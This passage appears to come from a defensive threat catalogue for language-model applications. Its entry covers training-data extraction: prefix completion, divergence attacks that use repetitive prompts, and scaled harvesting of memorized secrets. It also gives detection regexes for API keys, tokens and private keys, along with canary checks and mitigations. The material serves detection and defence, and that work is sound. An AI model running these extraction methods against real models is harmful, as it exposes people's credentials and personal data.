      ('completing' a partially-known secret); divergent repetition (forcing
      the model off-distribution, e.g. endless repetition, until it falls back
      to memorized text); and scaled extraction campaigns run against smaller
      or fine-tuned models. The defense-relevant fact: any secret in the
      training set is retrievable by anyone with query access.
    variants:
      - "Prefix-completion extraction: known prefixes used to pull memorized continuations containing secrets"
      - "Divergence attacks: repetitive prompts pushing the model off-distribution into verbatim memorized text"
      - "Scaled extraction: automated campaigns harvesting memorized PII and credentials at volume"
    indicators:
      - "Model outputs containing secret-shaped strings with no corresponding secret in the conversation context"
      - "Repeated verbatim long strings appearing across unrelated sessions"
      - "Query logs showing extraction-pattern prompts (long repetitive prefixes, known divergence triggers)"
    detection:
      rule: detect_memorized_secret_output
      patterns:
        - 'output-side secret-shape regexes on all model responses: sk-(ant|proj)-, AKIA[0-9A-Z]{16}, ghp_[A-Za-z0-9]{36}, -----BEGIN .*PRIVATE KEY-----'
        - 'query-log patterns: prompts containing more than 200 repeated tokens or known divergence triggers'
        - 'canary: unique canary secrets planted in training data; alert if any canary ever appears in outputs'
    severity: high
    mitigations:
      - "Sanitize training data: run secret scanners over corpora and deduplicate before training"
      - "Filter every model response for secret shapes before delivery"
      - "Apply differential-privacy training or PII-scrubbing pipelines; never train on raw user data containing credentials"
    examples:
      - summary: "Carlini et al., USENIX Security 2021: with only query access to GPT-2, researchers extracted hundreds of verbatim training examples including PII, IRC conversations, code, and 128-bit UUIDs; larger models proved more vulnerable."
        reference: "https://www.usenix.org/conference/usenixsecurity21/presentation/carlini-extracting"
      - summary: "GitGuardian State of Secrets Sprawl 2024: 12.8M new secret occurrences leaked on public GitHub in 2023 -- the raw material that ends up memorized in training corpora."
        reference: "https://securitysenses.com/posts/state-secrets-sprawl-2024"
    references:
      - "https://www.usenix.org/conference/usenixsecurity21/presentation/carlini-extracting"
      - "https://securitysenses.com/posts/state-secrets-sprawl-2024"
      - "https://www.kodemsecurity.com/resources/owasp-top-10-for-llm-applications"
